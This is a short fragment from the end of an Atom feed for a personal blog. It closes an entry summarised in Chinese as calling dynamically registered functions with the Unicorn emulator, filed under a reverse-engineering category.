type="text/css">]]></content>
    
    
    <summary type="html">unicorn调用动态注册的函数</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
</feed>
